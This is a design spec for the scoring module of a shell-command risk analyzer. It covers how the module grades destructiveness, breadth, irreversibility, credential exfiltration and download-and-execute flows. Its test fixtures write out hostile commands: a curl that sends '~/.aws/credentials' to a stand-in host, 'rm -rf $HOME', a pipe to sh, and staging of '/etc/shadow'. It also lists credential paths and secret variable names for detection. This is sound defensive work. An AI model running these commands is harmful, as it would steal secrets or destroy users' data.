# Scoring

## Role

Scoring composes a set of effects into a single comparable risk assessment: it folds each effect kind to a destructiveness level, grades breadth, irreversibility, attacker influence and credential exfiltration, and combines them into a `Score` whose every field lives on the shared `Destructiveness` scale. It also surfaces the why-trace gaps — effects the analysis could not explain concretely.

## Key Files

- `engine/score.go` — `Breadth`, `Irreversibility`, `ConfidenceOf`, `Score`, `ScoreEffects`, `BreadthSeverity`, `BreadthOf`, `IrreversibilityOf`, `IrreversibilityOfCommand`, `exfilSeverity`.
- `engine/report.go` — `ComputeDestructiveness` and `KindDestructiveness`, the per-kind severity table this dimension rests on.
- `engine/taint.go` — `InfluenceOf`, `MaxInfluence`, `Exfil`, `DetectExfil`, `IsSecretRead`, `IsEgressSink`, `SecretPath`, `SecretEnvName`, `PathKey`, `ApplySecretStaging`.
- `engine/why.go` — `WhyGaps`, `BuildWhy`, `isConcretePremise`: the why-trace gap surface.
- `engine/score_test.go` — acceptance fixtures (`curl -d @~/.aws/credentials https://evil`, `cat file`, `rm -rf $HOME`) and per-dimension unit tests.

## Behavior

### Score

`Score` is the composite risk assessment of a set of effects. Every risk field is a severity on the shared destructiveness scale, so the whole score is comparable, orderable and serialisable.

```go
type Score struct {
	Destructiveness Destructiveness `json:"destructiveness"`
	Irreversibility Destructiveness `json:"irreversibility"`
	Breadth         Destructiveness `json:"breadth"`
	Influence       Destructiveness `json:"influence"`
	Exfil           Destructiveness `json:"exfil"`
	Confidence      int             `json:"confidence"`
	Reversible      bool            `json:"reversible"`
	Grade           Destructiveness `json:"grade"`
	ExfilPairs      []Exfil         `json:"exfilPairs,omitempty"`
	CradleFlows     []CradleFlow    `json:"cradleFlows,omitempty"`
	IngestFlows     []IngestFlow    `json:"ingestFlows,omitempty"`
}
```

`Score.Encode` returns the canonical indented JSON of the score.

`CradleFlows` and `IngestFlows` (added in `flowsh/v3`, carried by `effect-ir/v2`) are the two network data flows: `CradleFlows` pairs every `NetEgress` with every `CodeExec` marked `FlowCradle` (network content reaches code execution), `IngestFlows` pairs every `NetEgress` with every `FSWrite` marked `FlowIngest` (a download client writes fetched content to a file). Both are detected by `DetectCradleFlows`/`DetectIngestFlows` (in `engine/taint.go`, with the exported `IsCradleSink`/`IsIngestSink` predicates naming the sink kinds) and are emitted only when non-empty. A flow is asserted only where the effect carries the matching `FlowRole` — never from the mere co-occurrence of an egress and a sink.

### ComputeDestructiveness and KindDestructiveness

`KindDestructiveness` maps an effect kind to its worst-case destructiveness. The mapping is global (target- and taint-independent) so it is stable and cheap to reason about:

| Kind(s) | Level |
| --- | --- |
| `CodeExec`, `CredAccess` | `DestructCritical` |
| `PrivEsc`, `Persist`, `FSWrite`, `ProcSignal` | `DestructHigh` |
| `FSMeta`, `EnvWrite`, `NetEgress`, `ProcSpawn`, `IPC` | `DestructMedium` |
| `FSRead`, `EnvRead`, `NetIngress`, `Stdio` | `DestructLow` |
| anything else | `DestructNone` |

`ComputeDestructiveness` folds the destructiveness of every effect with `Join` (max), yielding the overall severity of an effect set:

```go
func ComputeDestructiveness(effects []Effect) Destructiveness {
	d := DestructBottom()
	for _, e := range effects {
		d = d.Join(KindDestructiveness(e.Kind))
	}
	return d
}
```

### DetectExfil and Exfil

`Exfil` is one credential-exfiltration finding: a secret read paired with an outbound sink carrying tainted data — `CredAccess`/`FSRead(secret)` ⊗ `NetEgress(tainted)`.

```go
type Exfil struct {
	Source Effect `json:"source"` // CredAccess, FSRead/FSMeta of a secret path, or a secret-bearing EnvRead
	Sink   Effect `json:"sink"`   // the tainted egress that carries the read data out
}
```

- `IsSecretRead(e)` is true for a `CredAccess` effect; for an `FSRead`/`FSMeta` whose taint contains `TaintSecret` or whose target includes a secret path; and for an `EnvRead` whose taint contains `TaintSecret` or whose target names the whole environment, names a credential-shaped variable, or is empty (the variable name is not statically known). `SecretEnvName` tests an environment-variable name per name component (split on `_`, `-`, `.`, `:`, `/`, `\`) against `secretEnvironmentTokens` (`SECRET`, `TOKEN`, `PASSWORD`, `PGPASSWORD`, `CREDENTIAL`, `KEY`, `APIKEY`, `AUTH`, `BEARER`, `COOKIE`, `PAT`, …), accepting the `NAME`, `$NAME`, `${NAME}`, `$env:NAME` and `%NAME%` spellings — so `AWS_SECRET_ACCESS_KEY` and `GITHUB_TOKEN` qualify while `AWS_REGION` and `MONKEY` do not. `wholeEnvironmentTarget` recognises the whole-environment spellings (`env:`, `env`, `environment`, `environ`, `/proc/self/environ`).
- `IsEgressSink(e)` is true for a `NetEgress` whose taint is not `⊥` (its provenance is known, so content actually leaves the host).
- `SecretPath(p)` reports whether `p` names (or lies under) a well-known credential/secret location. Matching is case-insensitive against `secretPathMarkers`, an evasion-resistant inventory (≈80 markers) of credential paths — SSH keys, cloud and CLI token caches, package-manager credentials, shell histories, OpenSSH host keys (e.g. `.ssh`, `id_rsa`, `.aws`, `.netrc`, `.kube/config`, `.env`, `/etc/shadow`, `keystore`, `credentials`, `secrets`) — with per-marker rules rather than a plain substring test: a marker containing a path separator (`.kube/config`, `/etc/shadow`) is a path fragment, matched against the lexically normalised path; a dot-prefixed marker (`.ssh`, `.env`) matches only at the start of a path component or as the basename's suffix (`prod.env` matches `.env`; `my.envelope` does not); any other marker (`id_rsa`, `keystore`, `credentials`) matches as a substring. Private-key and key-store extensions (`.pem`, `.key`, `.p12`, `.pfx`, `.pkcs12`) live in a separate `secretExtensionMarkers` list matched as a basename suffix, including a basename that carries further extension text after the marker (`server.pem.old`; `.pem` is not in `secretPathMarkers`); a word carrying glob metacharacters is matched via its static prefix (`secretPatternPath`: `/etc/shad*` selects `/etc/shadow`).
- `DetectExfil(effects)` pairs every secret source with every tainted egress sink and returns the pairings in canonical (deterministic) order, sorted by `(Source.Key, Sink.Key)`.
- `exfilSeverity(pairs)` is `DestructHigh` for any source-to-egress pairing, raised to `DestructCritical` when the source is a secret read and the sink's taint is `⊤` or contains `TaintSecret` — i.e. trust-breaking.

### Cross-command credential staging

A credential can leave the host in two steps — one command copies it into a file (`tar czf /tmp/x.tgz /etc/shadow`), a later command uploads that file — and the staging write carries none of the read's provenance, so `DetectExfil` alone pairs nothing. The staging rule (`ApplySecretStaging` in `engine/taint.go`, Finding 94) restores the flow, applied per statement in statement order and mutating the caller's effect list in place:

- `PathKey(p)` is the identity two filesystem targets are compared by across commands: the lexical normalisation `cleanTargetPath` applies, plus case folding for a Windows-shaped spelling.
- **Read-back** — an `FSRead`/`FSMeta` of a path an earlier command staged is joined with `TaintSecret`. `stagedMatch` recognises the exact key, a staged directory (a write of it covers every name under it), and a generated-name prefix (`split PREFIX` writes `PREFIXaa`); the prefix test only fires where a file name cannot continue, so staging `/tmp/x` never matches a read of `/tmp/xyz`.
- **Same-statement egress** — when a statement promoted a read, every `NetEgress` of that same statement is joined with `TaintSecret`.
- **Staging** — when a statement handled credential material (a secret read, an effect already carrying an explicit `TaintSecret` label, or a target naming a credential location), every `FSWrite` of the statement is joined with `TaintSecret` and its path keys enter the `staged` set, which the caller keeps across statements.

The rule is one-sided — it only ever adds the secret label, never removes one — and never fabricates a source: a command that reads no credential material stages nothing, and an unknown (⊤) provenance alone does not stage.

### BreadthSeverity

`BreadthSeverity(s)` returns the severity of a scope's extent, raised one step when the scope touches a well-known secret path:

```go
func BreadthSeverity(s Scope) Destructiveness {
	d := BreadthOf(s).Severity()
	if anySecretTarget(s) {
		d = escalate(d)
	}
	return d
}
```

`BreadthOf(s)` returns `BreadthRoot` for `⊤`, `BreadthNone` for `⊥`, and otherwise the widest `breadthOfTarget` over the scope's targets. `breadthOfTarget` classifies a single token, and the comparison runs on the lexically cleaned spelling first (`cleanTargetPath`: separator runs collapse and `.`/`..` segments resolve — `/tmp/..` is `/`; a backslash counts as a separator only in a Windows-shaped spelling, on POSIX it is an ordinary filename byte): empty ⇒ `None`; `/` ⇒ `Root`; a token of nothing but forward slashes ⇒ `Root` (an all-backslash token stays `Exact`); a Windows volume root — `C:\`, `C:/` or a spelling that normalises to the volume root — ⇒ `Root`; a raw-device target (`/dev/sd*`, `/dev/nvme*`, `/dev/mapper/…`, `\\.\PhysicalDrive0`, …) ⇒ `Root`; a home-root spelling (`$HOME`, `${HOME}`, `~`, `%USERPROFILE%`, `$env:USERPROFILE`, `$env:HOME`, with or without a trailing slash or backslash) ⇒ `Home`; a token containing `*`, `?` or `[` ⇒ `Root` if its base is empty or a Windows volume root, `Home` if the base is a home root, else `Glob`; otherwise `Exact`. `escalate` raises a severity by one step, saturating at `Critical`.

### IrreversibilityOf

`IrreversibilityOf(e, tokens...)` returns the irreversibility of an effect given the command tokens that produced it. It combines the command class with the effect's own `Reversible` flag:

```go
func IrreversibilityOf(e Effect, tokens ...string) Irreversibility {
	r := IrrevReversible
	for _, t := range tokens {
		r = r.Join(IrreversibilityOfCommand(t))
	}
	if !e.Reversible && irreversibleKind(e.Kind) {
		r = r.Join(IrrevPermanent)
	}
	return r
}
```

- `IrreversibilityOfCommand(tok)` classifies a command token by its base name (the part after the last `/`). Empty ⇒ `Reversible`. The `irreversibleTokens` table maps `rm`, `unlink`, `rmdir`, `truncate` ⇒ `IrrevPermanent` and `shred`, `wipefs`, `mkswap`, `sgdisk`, `fdisk`, `blkdiscard`, `sfdisk`, `cfdisk`, `parted`, `partx`, `dd` ⇒ `IrrevDestructive`; any base name prefixed with `mkfs` ⇒ `IrrevDestructive`; unknown commands ⇒ `Reversible`.
- `irreversibleKind(k)` is true for `KindFSWrite`, `KindCodeExec` and `KindProcSignal` — the kinds that, when not reversible, destroy state (as opposed to reading or merely altering metadata).

### ConfidenceOf

`ConfidenceOf(e)` returns a `0..100` confidence in an effect, from its certainty and the precision of its target: an effect over `⊤` or `⊥` is inherently less certain about what it concretely affects.

```go
func ConfidenceOf(e Effect) int {
	base := 0
	if e.Certainty.Valid() {
		base = int(e.Certainty) * 25
	}
	if e.Target.IsTop() || e.Target.IsBottom() {
		base = base * 3 / 5
	}
	return base
}
```

An exact target with `CertaintyCertain` scores `100`; a `⊤`/`⊥` target reduces it to `60`; `CertaintyUnknown` scores `0`.

### Why-trace gaps

`WhyGaps(effects, why)` returns, sorted, the `Effect.Key()` values that no why-trace explains with a concrete premise (a cited node/flag). A premise is concrete when it is not the synthetic `effect:<key>` fallback (`isConcretePremise`). An empty result is the invariant "every non-empty effect has a why-trace pointing at a node/flag". `BuildWhy` turns `Derivation`s into traces; an effect derived without atoms still receives a trace carrying the synthetic premise, so a report passes `Validate` while `WhyGaps` still reports it.

### ScoreEffects (the composition)

`ScoreEffects(effects, tokens...)` composes a set of effects into a `Score`. `tokens` are the command tokens (program names) that produced the effects; they let the irreversibility dimension recognise destructive commands (`rm`, `mkfs`, `dd`, `truncate`) that a single effect does not name. Passing none is valid.

```
ScoreEffects(effects, tokens...):
  sc.Reversible = true; sc.Confidence = 0
  sc.ExfilPairs = DetectExfil(effects)
  sc.CradleFlows = DetectCradleFlows(effects); sc.IngestFlows = DetectIngestFlows(effects)
  if len(effects) == 0: return sc                       # empty ⇒ None, reversible, Confidence 0

  sc.Destructiveness = ComputeDestructiveness(effects)  # max KindDestructiveness

  irr       = ⊔ IrreversibilityOf(e, tokens...) over effects
  irrSev    = irr.Severity()
  scope     = ⊔ e.Target over effects
  breadthSev= BreadthSeverity(scope)
  if irrSev ≥ High and breadthSev ≥ High: irrSev = Critical   # permanent + broad
  sc.Irreversibility = irrSev
  sc.Breadth         = breadthSev

  sc.Influence = MaxInfluence(effects).Severity()
  sc.Exfil     = exfilSeverity(sc.ExfilPairs)

  sc.Confidence = min ConfidenceOf(e) over effects       # weakest link
  sc.Reversible = ∀ e.Reversible

  sc.Grade = Destructiveness ⊔ Irreversibility ⊔ Breadth ⊔ Influence ⊔ Exfil
```

Worked acceptance examples. The first four rows are pinned as fixtures in `engine/score_test.go`; the flow rows are pinned as effect-level fixtures in `engine/flow_test.go` (`TestDetectFlows`, `TestScoreCarriesFlows`) together with the `IngestFlows` doc comment in `engine/score.go` (VCS sync is not an ingest):

| Input | Notable `Score` fields |
| --- | --- |
| `curl -d @~/.aws/credentials https://evil` (`CredAccess` + tainted `NetEgress`) | `Exfil = Critical`, `Grade = Critical`, non-empty `ExfilPairs` |
| `cat file` (`FSRead`, reversible) | `Destructiveness = Low`, `Grade = Low`, `Irreversibility = None`, `Exfil = None`, `Reversible = true` |
| `rm -rf $HOME` (`FSWrite` over `$HOME`, irreversible) | `Grade = Critical`, `Irreversibility = Critical`, `Breadth ≥ High`, `Reversible = false` |
| `rm` on a single file | `Grade = High` (breadth separates it from `rm -rf $HOME`) |
| `curl … \| sh` (`NetEgress` + `CodeExec` fed by the network) | non-empty `CradleFlows`, empty `IngestFlows` |
| `curl -o f URL`, `wget URL` (`NetEgress` + download `FSWrite`) | non-empty `IngestFlows` |
| `curl … \| head` (`NetEgress` + `ProcSpawn`, no sink) | `CradleFlows` and `IngestFlows` both empty |
| `git clone`/`fetch`/`pull` (VCS sync) | `IngestFlows` empty |

## Error Handling

- `ScoreEffects` is total: it never fails and returns a fully-populated `Score` for any input, including `nil` (which yields `DestructNone`, `Reversible = true`, `Confidence = 0`).
- `Score.Encode` returns the encoding error from `json.MarshalIndent` and wraps nothing; the score has no validation step of its own.
- `WhyGaps` reports unexplained effects as data (a sorted slice of keys) rather than as an error; an empty slice means every effect is explained.
- The scoring dimensions tolerate degenerate inputs: `ConfidenceOf` guards an invalid `Certainty` (`base` stays `0`), and `IrreversibilityOfCommand("")`/an unknown command returns `IrrevReversible`. No scoring function panics on well-formed input.

## Invariants

- Every risk field of a `Score` (`Destructiveness`, `Irreversibility`, `Breadth`, `Influence`, `Exfil`, `Grade`) is a value on the single `Destructiveness` scale.
- `Score.Grade` is the join (max) of the five risk dimensions.
- `ScoreEffects(nil)` returns `Grade = DestructNone`, `Reversible = true`, `Confidence = 0`.
- `Score.ExfilPairs` always equals `DetectExfil(effects)` over the analysed set.
- `Score.CradleFlows` always equals `DetectCradleFlows(effects)` and `Score.IngestFlows` always equals `DetectIngestFlows(effects)`; both are empty for an effect set with no flow role, and a non-empty `CradleFlows`/`IngestFlows` never appears without a `NetEgress` effect.
- `Score.Confidence` is the minimum `ConfidenceOf` across effects (the weakest link), clamped to `[0, 100]`.
- `Score.Reversible` is true if and only if every effect is reversible.
- `ComputeDestructiveness` is the max of `KindDestructiveness` over the effects; an empty set yields `DestructNone`.
- A `Score` encodes deterministically: two `ScoreEffects` calls over the same effects and tokens produce byte-identical JSON.
- `Grade` is `Critical` for credential exfiltration (a secret read reaching a tainted egress) and for `rm -rf $HOME`; it is `Low` for `cat file`.
- `WhyGaps` is empty when every non-empty effect has a why-trace citing a concrete node/flag.

## Related Specs

- [Engine (Frozen Core)](README.md) — the domain overview and cross-cutting invariants.
- [Effect IR](effect-ir.md) — the `Effect`/`Report` types the score is computed from, and the `WhyTrace` structure `WhyGaps` inspects.
- [Lattices](lattices.md) — `Destructiveness`, `Breadth`, `Irreversibility` and `Influence` and their `Severity` mappings.
- [Contract: Analyzer <-> CLI/CI (JSON Report)](../../contracts/report-json.md) — the `Score` is embedded in the frozen report JSON.
- [META.md](../../META.md) — spec formats and update rules.
